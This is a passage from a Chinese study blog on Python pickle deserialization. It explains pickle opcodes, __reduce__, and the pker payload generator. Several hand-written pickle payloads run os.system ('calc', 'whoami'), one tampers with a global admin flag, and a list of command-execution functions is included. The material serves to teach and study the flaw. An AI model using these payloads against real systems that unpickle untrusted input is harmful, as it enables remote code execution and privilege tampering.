<p><code>u</code> 为添加多个 key-value，操作与 <code>d</code> 类似</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">    <span class="comment">#C 测试 ) &#125; ] u s 操作码</span></span><br><span class="line">    x3 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;&#125;S&#x27;koishi&#x27;</span></span><br><span class="line"><span class="string">S&#x27;cirno&#x27;</span></span><br><span class="line"><span class="string">s.&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x3)           <span class="comment"># &#123;&#x27;koishi&#x27;: &#x27;cirno&#x27;&#125;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(x3))     <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">    x4 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;&#125;(S&#x27;koishi&#x27;</span></span><br><span class="line"><span class="string">S&#x27;cirno&#x27;</span></span><br><span class="line"><span class="string">u.&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x4)           <span class="comment"># &#123;&#x27;koishi&#x27;: &#x27;cirno&#x27;&#125;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(x4))     <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="a-e-b-c"><a href="#a-e-b-c" class="headerlink" title="a e b c"></a><code>a e b c</code></h4><p><code>a</code> 将栈顶元素放入其后的 list 中，对应 <code>list.append(value)</code> 操作</p>
<p><code>e</code> 为添加多个元素，操作与 <code>l</code> 类似</p>
<p><code>b</code> 用于修改栈中的对象，调用对应类设定的 <code>__setstate__</code> 函数 (若有) 或默认的 <code>__dict__.update</code> 来修改对象的元素，栈顶为调用 update 的参数，需要一个 dict 参数，后一个元素为对应修改的对象</p>
<p><code>c</code> 为最常见的 opcode 之一，其作用可以归结为调用 <code>find_class</code> 方法并将结果入栈，其接收两个参数，第一个参数为 <code>modname</code>，第二个参数为 <code>name</code></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">    <span class="comment"># a e b c 操作码测试</span></span><br><span class="line">    test = test()</span><br><span class="line">    x5 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;c__main__</span></span><br><span class="line"><span class="string">test</span></span><br><span class="line"><span class="string">(S&#x27;a&#x27;</span></span><br><span class="line"><span class="string">I6</span></span><br><span class="line"><span class="string">db.&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x5.a)</span><br><span class="line"><span class="comment"># 这里是用c find到了对象test</span></span><br><span class="line"><span class="comment"># 然后b调用函数来修改对象中的属性，因为要求传入一个dict所以调用d，上面压入的是两个参数</span></span><br><span class="line"><span class="comment"># 栈底是要修改的对象a，栈顶是传入的参数，很好理解</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    0: c    GLOBAL     &#x27;__main__ test&#x27;</span></span><br><span class="line"><span class="comment">#   15: (    MARK</span></span><br><span class="line"><span class="comment">#   16: S        STRING     &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#   21: I        INT        6</span></span><br><span class="line"><span class="comment">#   24: d        DICT       (MARK at 15)</span></span><br><span class="line"><span class="comment">#   25: b    BUILD</span></span><br><span class="line"><span class="comment">#   26: .    STOP</span></span><br><span class="line"><span class="comment"># highest protocol among opcodes = 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h4 id="栈stack-和-临时内存memo-间的操作-p-q-r-g-h-j"><a href="#栈stack-和-临时内存memo-间的操作-p-q-r-g-h-j" class="headerlink" title="栈stack 和 临时内存memo 间的操作 p q r g h j"></a>栈stack 和 临时内存memo 间的操作 <code>p q r g h j</code></h4><p><code>p</code> <code>q</code> <code>r</code> 将栈顶的元素放入 memo (一个临时使用的内存) 中，其接收一个参数，为该元素在 memo 中的索引，区别在于索引的类型不同<br><code>g</code> <code>h</code> <code>j</code> 与之相对应，接收一个参数作为索引，在 memo 中寻找该索引对应的元素放入栈顶<br>这三对 opcode 一般用于弹出或修改非栈顶元素时，将栈顶元素临时保存，稍微麻烦亿点点，这里就不做过多演示了，后续去复现真题去慢慢研究。</p>
<h4 id="R"><a href="#R" class="headerlink" title="R"></a><code>R</code></h4><p><code>R</code> 为最常被过滤的 opcode，其由特殊方法 <strong>reduce</strong> 产生，对栈顶的 tuple 进行 callable 操作，第一个元素为一个可调用的对象 (一般通过 c 获取)，第二个元素为一个 tuple 储存调用的参数（这里以下面的Reduce的魔术方法演示的代码为例进行修改。由于我写笔记是感觉哪里合适写入就去对应的地方插入，因此你看到的顺序并不是我学习的路线&#x3D;。&#x3D;，这里我以我认为最为合适的方式写的文章顺序）</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    x6 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面加上p0也行，这个memo的使用还有待学习</span></span><br><span class="line"><span class="string">b&quot;&quot;&quot;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">tp0</span></span><br><span class="line"><span class="string">R.&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="i-o"><a href="#i-o" class="headerlink" title="i o"></a><code>i o</code></h4><p><strong><code>i</code> <code>o</code> 均用于创建类的实例，也可用于调用方法，其区别在于使用方法和参数传递方法的不同</strong></p>
<p><strong><code>i</code> 接收两个参数 (在 opcode 后跟参数)，分别对应 <code>modname</code> 与 <code>name</code>，创建实例或调用方法所用参数为使用 <code>i</code> 时栈内内容，以 mark object 标识数据开始</strong></p>
<p>测试1——命令执行</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;(S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p>测试2——修改类属性</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        x7 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;(S&#x27;koishi&#x27;</span></span><br><span class="line"><span class="string">S&#x27;cirno&#x27;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">test2</span></span><br><span class="line"><span class="string">.&quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x7.a)     <span class="comment">#koishi</span></span><br><span class="line">    <span class="built_in">print</span>(x7.b)     <span class="comment">#cirno</span></span><br></pre></td></tr></table></figure></div>



<p><code>o</code> 不接收参数，其使用栈上的元素，以 mark object 标识数据开始，<strong>第一个元素为类或可调用的对象</strong>，之后的元素为其参数</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">    x8 = pickle.loads(</span><br><span class="line"><span class="string">b&quot;&quot;&quot;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>



<h2 id="Pickle-CPickle反序列化漏洞分析"><a href="#Pickle-CPickle反序列化漏洞分析" class="headerlink" title="Pickle&#x2F;CPickle反序列化漏洞分析"></a>Pickle&#x2F;CPickle反序列化漏洞分析</h2><p>反序列化漏洞出现在 <strong>reduce</strong>()魔法函数上，这一点和PHP中的__wakeup()魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。</p>
<p>而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.</p>
<p>另外pickle.loads会解决import问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。</p>
<h3 id="🚩命令执行函数"><a href="#🚩命令执行函数" class="headerlink" title="🚩命令执行函数"></a>🚩命令执行函数</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, input,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.open,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.open,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure></div>



<h3 id="漏洞可能出现的位置："><a href="#漏洞可能出现的位置：" class="headerlink" title="漏洞可能出现的位置："></a><strong>漏洞可能出现的位置：</strong></h3><blockquote>
<ul>
<li><p><strong>解析认证token、session的时候</strong></p>
</li>
<li><p><strong>将对象Pickle后存储成磁盘文件</strong></p>
</li>
<li><p><strong>将对象Pickle后在网络中传输</strong></p>
</li>
<li><p><strong>参数传递给程序</strong></p>
</li>
</ul>
</blockquote>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__reduce__()</span><br></pre></td></tr></table></figure></div>



<h4 id="object-reduce"><a href="#object-reduce" class="headerlink" title="object.reduce()"></a>object.<strong>reduce</strong>()</h4><p>通过重写类的 object.<strong>reduce</strong>() 函数，使之在被实例化时按照重写的方式进行，对应opcode当中的R指令</p>
<p><strong>官方解释</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1669995559867-acf028e3-0817-4c69-971f-5842d4b6a022.png"
                      alt="20201004203224544.png"
                ></p>
<p>当 <code>__reduce__()</code> 函数返回一个元组时 , <strong>第一个元素</strong>是一个可调用对象 , 这个对象会在创建对象时被调用 . <strong>第二个元素</strong>是可调用对象的参数 , 同样是一个元组。这点跟我们上面提到的PVM中的<code>R</code>操作码功能相似</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">R:将之前压入栈中的元组和可调用对象全部弹出, 然后将该元组作为可调用参数的对象并执行该对象。最后将结果压入到栈中</span><br></pre></td></tr></table></figure></div>

<p> 事实上, <code>R</code>操作码就是 <code>__reduce__()</code> 魔术函数的底层实现, 而在反序列化过程结束的时候, Python 进程会自动调用 <code>__reduce__()</code> 魔术方法, 如果可以控制被调用函数的参数, Python 进程就可以执行恶意代码</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reduce_test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;calc&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reduce_test</span>():</span><br><span class="line">    r = Reduce_test()</span><br><span class="line">    ser = pickle.dumps(r)</span><br><span class="line">    pickle.loads(ser)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    reduce_test()</span><br><span class="line"></span><br><span class="line"><span class="comment"># __reduce__()魔法方法的返回值:</span></span><br><span class="line"><span class="comment"># return(os.system,(cmd,))</span></span><br><span class="line"><span class="comment"># 1.满足返回一个元组，元组中至少有两个参数</span></span><br><span class="line"><span class="comment"># 2.第一个参数是被调用函数 : os.system()</span></span><br><span class="line"><span class="comment"># 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd</span></span><br><span class="line"><span class="comment"># 4. 因此序列化时被解析执行的代码是 os.system(&quot;whoami&quot;)</span></span><br></pre></td></tr></table></figure></div>



<p><strong>下图是PVM解析 <code>__reduce__()</code> 的过程动图：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/64a734edb41004a2845da0c6401f4d8a.gif"
                      alt="image-20220509001219887"
                ></p>
<p>通过上面的学习后，这里很容易理解。先是获取builtin库中的file函数，随后压入一个MARK，拿到  (“&#x2F;etc&#x2F;passwd”, ) 元组，随后将栈内第一位作为可执行函数，第二位作为参数（必须为元组），随后执行。</p>
<p>（由于对python接触不多，了解了一下builtin<a class="link"   href="https://www.cnblogs.com/Ladylittleleaf/p/10240096.html" >理解Python中的__builtin__和_builtins <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</p>
<p>有两种内建函数可以获取文件对象：open和file。他们的用法完全一样(我本地是python3.8，貌似没有file，我就用open尝试)。</p>
<p>上述内容基本等价于</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    builtins.<span class="built_in">open</span>(<span class="string">r&quot;/etc/passwd&quot;</span>)</span><br><span class="line">    <span class="comment"># print(builtins.open(r&quot;R://a/hello.txt&quot;).read(100))</span></span><br></pre></td></tr></table></figure></div>



<h4 id="object-setstate-state"><a href="#object-setstate-state" class="headerlink" title="object.__setstate__(state)"></a><strong>object</strong>.<code>__setstate__</code>(state)</h4><p>用于设置对象属性，执行obj[key]&#x3D;value的时候自动调用，<strong>对应opcode当中的b指令</strong>。</p>
<p>当解封时，如果类定义了 <strong>setstate</strong>()，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 dict。</p>
<h3 id="基础利用方法"><a href="#基础利用方法" class="headerlink" title="基础利用方法"></a>基础利用方法</h3><h4 id="1-执行恶意命令"><a href="#1-执行恶意命令" class="headerlink" title="1.执行恶意命令"></a>1.执行恶意命令</h4><ul>
<li><p>可以直接调用__reduce__方法</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Evil()))</span><br><span class="line">pickletools.dis(pickle.dumps(Evil()))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
</ul>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">30</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;nt&#x27;</span></span><br><span class="line">   <span class="number">15</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line">   <span class="number">16</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">24</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line">   <span class="number">25</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">26</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line">   <span class="number">27</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">35</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line">   <span class="number">36</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">37</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line">   <span class="number">38</span>: R    REDUCE</span><br><span class="line">   <span class="number">39</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line">   <span class="number">40</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>可以手写操作码</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">getattr</span></span><br><span class="line">(c__builtin__</span><br><span class="line"><span class="built_in">__import__</span></span><br><span class="line">(S<span class="string">&#x27;os&#x27;</span></span><br><span class="line">tRS<span class="string">&#x27;system&#x27;</span></span><br><span class="line">tR(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure></div>

<p>也可以用o和i来构造</p>
</li>
</ul>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="2-修改全局变量"><a href="#2-修改全局变量" class="headerlink" title="2.修改全局变量"></a>2.修改全局变量</h4><p>通过 <code>c</code> 操作码可以获取到任意对象，<code>b</code> 操作码可以对任意对象进行修改，此时就可以获取全局对象并进行修改</p>
<p>比如：</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">secret = &#123;<span class="string">&#x27;ADMIN&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">if</span> secret.ADMIN == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p>如果想要修改secret里的变量，可以调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__main__.secret.update(&#123;&#x27;ADMIN&#x27;: 1&#125;)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line">getattr</span><br><span class="line">(c__main__</span><br><span class="line">secret</span><br><span class="line">S&#x27;update&#x27;</span><br><span class="line">tR((S&#x27;ADMIN&#x27;</span><br><span class="line">I1</span><br><span class="line">dtR.</span><br></pre></td></tr></table></figure></div>

<p>（这个比较麻烦，个人认为getattr等内容可以通过b操作码进行修改，未作尝试，有兴趣可以试试，应该是能行的）</p>
<p><strong>pker工具生成</strong>（建议还是先学会操作码什么意思之后，再去使用工具，万一生成的内容存在黑名单，还需要自己去修改）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret = GLOBAL(&#x27;__main__&#x27;, &#x27;secret&#x27;)</span><br><span class="line">update = GLOBAL(&#x27;__builtin__&#x27;, &#x27;getattr&#x27;)(secret, &#x27;update&#x27;)</span><br><span class="line">update(&#123;&#x27;ADMIN&#x27;: 1&#125;)</span><br><span class="line">return</span><br></pre></td></tr></table></figure></div>



<h4 id="3-获取其它模块中的隐私数据"><a href="#3-获取其它模块中的隐私数据" class="headerlink" title="3.获取其它模块中的隐私数据"></a>3.获取其它模块中的隐私数据</h4><h3 id="绕过过滤方法"><a href="#绕过过滤方法" class="headerlink" title="绕过过滤方法"></a>绕过过滤方法</h3><p>官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决</p>
<p><strong>很多时候都要靠python的内置模块去绕过</strong></p>
<h2 id="pker工具使用"><a href="#pker工具使用" class="headerlink" title="pker工具使用"></a>pker工具使用</h2><p><a class="link"   href="https://github.com/eddieivan01/pker" >pker开源地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>它可以自动化生成Pickle opcode</p>
<p>一般来说它可以按照python正常的写法来生成opcode，下面翻译一下README.md的内容</p>
<p><strong>和普通python不同的地方再：</strong></p>
<ul>
<li><p><strong>3个内置的模块生成方式</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>return</code> 可以在函数之外使用</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var = 1</span><br><span class="line">return var</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">return           =&gt;  .</span><br><span class="line">return var       =&gt;  g_\n.</span><br><span class="line">return 1         =&gt;  I1\n.</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="使用方法和示例"><a href="#使用方法和示例" class="headerlink" title="使用方法和示例"></a>使用方法和示例</h3><ol>
<li>pker中的针对pickle的<strong>特殊语法</strong>需要重点掌握（后文给出示例）</li>
<li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
<li>pker<strong>主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数</strong>以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">以下module都可以是包含`.`的子module</span><br><span class="line">调用函数时，注意传入的参数类型要和示例一致</span><br><span class="line">对应的opcode会被生成，但并不与pker代码相互等价</span><br><span class="line"></span><br><span class="line">GLOBAL</span><br><span class="line">对应opcode：b&#x27;c&#x27;</span><br><span class="line">获取module下的一个全局对象（没有import的也可以，比如下面的os）：</span><br><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">输入：module,instance(callable、module都是instance)  </span><br><span class="line"></span><br><span class="line">INST</span><br><span class="line">对应opcode：b&#x27;i&#x27;</span><br><span class="line">建立并入栈一个对象（可以执行一个函数）：</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)  </span><br><span class="line">输入：module,callable,para </span><br><span class="line"></span><br><span class="line">OBJ</span><br><span class="line">对应opcode：b&#x27;o&#x27;</span><br><span class="line">建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;) </span><br><span class="line">输入：callable,para</span><br><span class="line"></span><br><span class="line">xxx(xx,...)</span><br><span class="line">对应opcode：b&#x27;R&#x27;</span><br><span class="line">使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）</span><br><span class="line"></span><br><span class="line">li[0]=321</span><br><span class="line">或</span><br><span class="line">globals_dic[&#x27;local_var&#x27;]=&#x27;hello&#x27;</span><br><span class="line">对应opcode：b&#x27;s&#x27;</span><br><span class="line">更新列表或字典的某项的值</span><br><span class="line"></span><br><span class="line">xx.attr=123</span><br><span class="line">对应opcode：b&#x27;b&#x27;</span><br><span class="line">对xx对象进行属性设置</span><br><span class="line"></span><br><span class="line">return</span><br><span class="line">对应opcode：b&#x27;0&#x27;</span><br><span class="line">出栈（作为pickle.loads函数的返回值）：</span><br><span class="line">return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为 <strong>左值</strong> ，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符， <strong>作为右值是可以的</strong> 。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用<strong>单引号</strong>包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<h4 id="pker几个简单测试"><a href="#pker几个简单测试" class="headerlink" title="pker几个简单测试"></a>pker几个简单测试</h4><h5 id="1-实例化对象"><a href="#1-实例化对象" class="headerlink" title="1. 实例化对象"></a>1. 实例化对象</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">instance=INST(&#x27;__main__&#x27;, &#x27;Koishi&#x27;, &#x27;hello&#x27;,&#x27;world&#x27;)</span><br><span class="line">return instance</span><br></pre></td></tr></table></figure></div>

<p>例子</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Koishi</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    cirno = <span class="string">&quot;&quot;</span></span><br><span class="line">    reimu = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">        self.cirno = a</span><br><span class="line">        self.reimu = b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># pker: 实例化对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pker执行语句为：</span></span><br><span class="line">    <span class="comment"># instance = INST(&#x27;__main__&#x27;, &#x27;Koishi&#x27;, &#x27;hello&#x27;, &#x27;world&#x27;)</span></span><br><span class="line">    <span class="comment"># return instance</span></span><br><span class="line"></span><br><span class="line">    x = pickle.loads(<span class="string">b&quot;(S&#x27;hello&#x27;\nS&#x27;world&#x27;\ni__main__\nKoishi\np0\n0g0\n.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x.cirno)</span><br><span class="line">    <span class="built_in">print</span>(x.reimu)</span><br></pre></td></tr></table></figure></div>

<p>下面两个也行，通过不同的操作码进行实例化</p>
